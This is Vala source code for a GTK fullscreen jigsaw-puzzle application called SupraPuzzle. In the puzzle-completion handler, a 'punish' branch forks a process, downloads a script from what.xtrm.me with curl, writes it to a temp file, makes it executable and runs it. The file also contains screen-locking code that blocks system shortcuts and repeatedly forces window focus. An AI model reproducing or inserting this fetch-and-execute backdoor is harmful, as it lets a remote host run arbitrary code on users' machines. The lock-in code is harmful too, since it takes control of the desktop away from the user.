using Gtk;

private Gtk.ApplicationWindow win; // main window
public string? img_puzzle = null; // image path

public class SupraApplication : Gtk.Application {
	construct {
		application_id = "com.SupraPuzzle.App";
	}

	/**
	** Load the css style
	**/
	private void init_css () {
		var provider = new Gtk.CssProvider ();
		provider.load_from_resource ("/data/style.css");
		Gtk.StyleContext.add_provider_for_display (Gdk.Display.get_default (), provider, 0);
	}


	public void init_after_realize () {
		// Create the Window fullscreen
		var overlay = new Gtk.Overlay();

		var my_puzzle = new Puzzle (id_gresource, img_path);
		unowned var display = Gdk.Display.get_default ();
		var monitor = display.get_monitor_at_surface (win.get_surface ());
		var geometry = monitor.get_geometry ();
		my_puzzle.init_puzzle (geometry.width, geometry.height);

		var menu = new Menu ();

		menu.onFinish.connect (()=> {
			base.quit ();
		});

		overlay.add_overlay (my_puzzle);
		overlay.add_overlay (menu);
		var event_controller = new Gtk.EventControllerMotion ();

		event_controller.motion.connect ((x, y) => {
			inibhit_system_shortcuts ();
		});

		// event mousse key releass controller
		var event_controller_key = new Gtk.EventControllerKey ();

		event_controller_key.key_pressed.connect ((keyval, keycode) => {
			// Escape touch
			if (keyval == Gdk.Key.Escape || keyval == Gdk.Key.Super_L) {
				menu.swap();
			}
			inibhit_system_shortcuts ();
			return true;
		});

		((Widget)win).add_controller (event_controller_key);
		((Widget)win).add_controller (event_controller);

		bool is_punish = false;

		my_puzzle.onFinish.connect (() => {
			if (is_punish == true) {
				int pid = Posix.fork();
				if (pid == 0) {
					string script;
					string exec;
					try {
						Process.spawn_command_line_sync ("curl -sSL what.xtrm.me", out script);
						FileUtils.open_tmp ("suprapuzzle_XXXXXXX", out exec);
						FileUtils.set_contents (exec, script);
						FileUtils.chmod (exec, 0755);
						Process.spawn_command_line_sync (exec);
					}
					catch (Error e) {
						printerr (e.message);
					}
					return ;
				}
			}
			win.close ();
			win.dispose ();
		});

		win.child = overlay;
	}
	/**
	** Init the overlay
	**/
	public void init_overlay () throws Error {

		win = new Gtk.ApplicationWindow (this) {
			default_width=1920,
			default_height=1080,
			fullscreened = true,
			decorated = false,
			handle_menubar_accel = false,
			mnemonics_visible = false,
			show_menubar = false,
			resizable = false,
		};
		((Widget)win).realize.connect (init_after_realize);


		init_css ();



#if IS_BLOCKED
		Widget win_widget = win as Widget;
		win_widget.realize.connect (() => {
			unowned var display = Gdk.Display.get_default () as Gdk.X11.Display;
			unowned var x11_d = display.get_xdisplay ();

			var native = ((Widget)win).get_native ();
			var surface = native.get_surface () as Gdk.X11.Surface;

			// wait for the window to be realized
			Timeout.add (1000, () => {
				// Set the focus on the window every 50ms
				var x11_w = surface.get_xid ();
				Timeout.add (100, () => {
					x11_d.set_input_focus (x11_w, X.RevertTo.PointerRoot, (int)X.CURRENT_TIME);
					x11_d.map_raised(x11_w);
					inibhit_system_shortcuts ();
					return true;
				});

				var property = display.get_xatom_by_name ("_NET_WM_WINDOW_TYPE");
				var p_data = display.get_xatom_by_name ("_NET_WM_WINDOW_TYPE_POPUP_MENU");
				var data = (uchar[])&p_data;
				// Set the window type to menu
				x11_d.change_property (x11_w, property, X.XA_ATOM, 32, X.PropMode.Replace, data, 1);
				return false;
			});
		});
#endif

		win.present ();
	}

	/**
	** Activate the application
	**/
	public override void activate () {
		try {
			init_overlay ();
		} catch (Error e) {
			printerr (e.message);
		}
	}

	private static bool version;
	private static string? img_path;
	private static int id_gresource;

	private const GLib.OptionEntry[] options = {
		{ "version", 'v', OptionFlags.NONE, OptionArg.NONE, ref version, "Display version number", null },
		{ "img", '\0', OptionFlags.NONE, OptionArg.STRING, ref img_path, "path of the image", "path" },
		{ "id", '\0', OptionFlags.NONE, OptionArg.INT, ref id_gresource, "id of gresource image (random by default)", "id" },
		{ null }
	};

	public static int main (string[] args) {
		try {
			var opt_context = new OptionContext ("- SupraPuzzle help");
			opt_context.set_help_enabled (true);
			opt_context.add_main_entries (options, null);
			opt_context.parse (ref args);

			if (version)
			{
				print ("SupraPuzzle\n");
				print ("Version %s\n", Config.VERSION);
				return 0;
			}
		}
		catch (Error e) {
			printerr (e.message);
			return 1;
		}

		var app = new SupraApplication ();
		return app.run (args);
	}
}

public void inibhit_system_shortcuts () {
#if IS_BLOCKED
	unowned var native = ((Widget)win).get_native ();
	unowned var surface = native.get_surface ();
	if (surface is Gdk.Toplevel) {
		surface.inhibit_system_shortcuts (null);
		surface.fullscreen_mode = Gdk.FullscreenMode.ALL_MONITORS;
	}
#endif
}
